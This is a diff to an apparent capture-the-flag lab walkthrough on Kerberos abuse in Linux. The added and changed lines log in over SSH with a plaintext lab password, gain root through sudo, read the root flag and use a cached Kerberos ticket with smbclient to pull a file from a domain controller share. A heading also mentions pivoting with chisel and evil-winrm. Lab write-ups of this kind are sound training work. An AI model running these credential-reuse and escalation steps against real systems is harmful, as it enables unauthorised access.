@@ -59,7 +59,7 @@ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
 ## Check the sudo privileges of the svc_workstations user and get access as root. Submit the flag in /root/flag.txt directory as the response.
 
 ```
-ssh svc_workstations@inlanefreight.htb@10.129.14.234 -p 2222
+ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
 Password4
 sudo su
 cat /root/flag.txt
@@ -80,6 +80,19 @@ cat julio.txt
 ```
 
 ## Use the LINUX01$ Kerberos ticket to read the flag found in \\DC01\linux01. Submit the contents as your response (the flag starts with Us1nG_).
+```
+ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
+Password4
+sudo su
+
+smbclient //DC01/C$
+klist
+cd SharedFolder\linux01\
+get flag.txt
+exit
+cat flag.txt
+
+```
 
 
 ## Transfer Julio's ccache file from LINUX01 to your attack host. Follow the example to use chisel and proxychains to connect via evil-winrm from your attack host to MS01 and DC01. Mark DONE when finished.
